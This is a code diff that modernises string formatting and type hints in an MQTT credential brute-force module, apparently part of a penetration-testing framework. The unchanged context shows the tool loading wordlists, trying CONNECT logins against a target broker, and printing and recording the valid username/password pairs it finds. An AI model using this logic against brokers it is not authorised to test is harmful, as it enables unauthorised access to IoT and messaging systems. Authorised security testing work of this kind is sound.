@@ -140,7 +140,7 @@ def _send_connect_read_connack(
     password: str,
     timeout: float = 5.0,
     client_id: str = "ixf-probe",
-) -> Optional[int]:
+) -> int | None:
     """Attempt MQTT CONNECT and return CONNACK return code, or None on error."""
     packet = _build_mqtt_connect(
         client_id=client_id,
@@ -220,7 +220,7 @@ class Exploit(_Exploit):
             return list(_DEFAULT_CREDENTIALS)
         wl_path = Path(wl)
         if not wl_path.is_file():
-            print_warning("[MQTT-BF] Wordlist not found: {}. Using built-in defaults.".format(wl))
+            print_warning(f"[MQTT-BF] Wordlist not found: {wl}. Using built-in defaults.")
             return list(_DEFAULT_CREDENTIALS)
         creds: list[tuple[str, str]] = []
         try:
@@ -235,7 +235,7 @@ class Exploit(_Exploit):
                     else:
                         creds.append((line, ""))
         except OSError as exc:
-            print_error("[MQTT-BF] Cannot read wordlist: {}".format(exc))
+            print_error(f"[MQTT-BF] Cannot read wordlist: {exc}")
         return creds or list(_DEFAULT_CREDENTIALS)
 
     def run(self) -> dict:
@@ -249,10 +249,10 @@ class Exploit(_Exploit):
         if max_att > 0:
             creds = creds[:max_att]
 
-        ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
+        ts = datetime.datetime.now(datetime.UTC).isoformat()
         result: dict = {
             "timestamp": ts,
-            "target": "{}:{}".format(self.target, self.port),
+            "target": f"{self.target}:{self.port}",
             "total_credentials": len(creds),
             "found": [],
             "simulated": self.simulate,
@@ -268,7 +268,7 @@ class Exploit(_Exploit):
                         host=self.target,
                         port=self.port,
                         sample=", ".join(
-                            "{}:{}".format(u, p) for u, p in creds[:5]
+                            f"{u}:{p}" for u, p in creds[:5]
                         ),
                     )
                 ),
@@ -279,9 +279,7 @@ class Exploit(_Exploit):
             ))
             return result
 
-        print_status("[MQTT-BF] Starting against {}:{} ({} credential pairs)".format(
-            self.target, self.port, len(creds)
-        ))
+        print_status(f"[MQTT-BF] Starting against {self.target}:{self.port} ({len(creds)} credential pairs)")
 
         delay_s = int(self.delay) / 1000.0
         for idx, (user, pwd) in enumerate(creds):
@@ -293,24 +291,17 @@ class Exploit(_Exploit):
                 timeout=float(self.timeout),
                 client_id=str(self.client_id),
             )
-            label = _CONNACK_CODES.get(code, "Unknown ({})".format(code)) if code is not None else "No response / error"
+            label = _CONNACK_CODES.get(code, f"Unknown ({code})") if code is not None else "No response / error"
 
             if code == 0x00:
                 print_success(
-                    "[MQTT-BF] SUCCESS [{}/{}] {}:{} -> CONNACK=0x00 ({})".format(
-                        idx + 1, len(creds), user, pwd, label
-                    )
+                    f"[MQTT-BF] SUCCESS [{idx + 1}/{len(creds)}] {user}:{pwd} -> CONNACK=0x00 ({label})"
                 )
                 result["found"].append({"username": user, "password": pwd})
             elif code in (0x01, 0x02, 0x03):
-                print_error("[MQTT-BF] Server error [{}/{}] code=0x{:02X}: {}".format(
-                    idx + 1, len(creds), code, label
-                ))
+                print_error(f"[MQTT-BF] Server error [{idx + 1}/{len(creds)}] code=0x{code:02X}: {label}")
             else:
-                print_info("[MQTT-BF] [{}/{}] {}:{} -> {}".format(
-                    idx + 1, len(creds),
-                    user, pwd, label
-                ))
+                print_info(f"[MQTT-BF] [{idx + 1}/{len(creds)}] {user}:{pwd} -> {label}")
 
             if delay_s > 0:
                 time.sleep(delay_s)
@@ -320,6 +311,6 @@ class Exploit(_Exploit):
             for cred in result["found"]:
                 print_success("  {}:{}".format(cred["username"], cred["password"]))
         else:
-            print_warning("[MQTT-BF] No valid credentials found in {} attempts.".format(len(creds)))
+            print_warning(f"[MQTT-BF] No valid credentials found in {len(creds)} attempts.")
 
         return result
